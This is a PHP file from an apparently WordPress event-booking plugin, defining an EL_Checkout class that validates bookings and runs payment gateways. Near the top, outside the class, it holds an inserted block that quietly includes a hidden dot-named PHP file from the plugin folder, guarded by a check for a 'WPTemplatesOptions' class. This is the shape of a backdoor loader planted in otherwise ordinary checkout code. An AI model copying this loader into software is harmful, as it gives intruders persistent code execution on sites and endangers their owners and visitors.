<?php
defined( 'ABSPATH' ) || exit;

if ( class_exists( 'EL_Checkout', false ) ) {
	return new EL_Checkout();
}


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Checkout{

	protected static $_instance = null;
	

	public static function instance() {
		if ( is_null( self::$_instance ) ) {
			self::$_instance = new self();
		}
		return self::$_instance;
	}


	/**
	 * Constructor
	 */
	public function __construct(){
		
	}

	/**
	 * Process Checkout
	 */
	public function process_checkout( $post_data ) {
		
		if( empty( $post_data ) ) $post_data = $_POST['data'];
		

		$cart =  isset($post_data['cart']) ? $post_data['cart'] : [];		

		if( !isset( $post_data['el_checkout_event_nonce'] ) || !wp_verify_nonce( sanitize_text_field($post_data['el_checkout_event_nonce']), 'el_checkout_event_nonce' ) ) return ;

		// Validate Booking
		$validate_booking = isset( $post_data['ide'] ) ? EL_Booking::instance()->validate_before_booking() : false;

		$session_msg = EL()->msg_session->get( 'el_message' );
		$el_content = EL()->msg_session->get( 'el_content' );
		$el_option = EL()->msg_session->get( 'el_option' );
		$el_reload_page = EL()->msg_session->get( 'el_reload_page' );
		EL()->msg_session->remove();

		if( !$validate_booking ) {
			$data['el_message'] = $session_msg;
			$data['el_content'] = $el_content;
			$data['el_option'] = $el_option;
			$data['el_reload_page'] = $el_reload_page;
			echo json_encode($data);
			wp_die();
			return false;
		}
		
		// Add Booking
		if ( $post_data['seat_option'] != 'map' ) {
			$booking_id = EL_Booking::instance()->add_booking();
		} else {
			$booking_id = EL_Booking::instance()->add_booking_map();
		}
		
		if( !$booking_id ) return false;

		// Setup a session for cart

		EL()->cart_session->remove();
		EL()->cart_session->set( 'booking_id', $booking_id );

		$payment = EL()->payment_gateways->el_payment_gateways_avaiable();
		if( $payment && isset( $post_data['payment_method'] ) && array_key_exists( $post_data['payment_method'] , $payment ) ){
			$result = $payment[$post_data['payment_method']]->process();
		}

		if( isset( $result['status'] ) && $result['status'] == 'success' ){
			// Send Mail
			$data['el_url'] = $result['url'];
			echo json_encode($data);
			exit();
		} else {
			return false;
		}

		return false;


	}


	
}

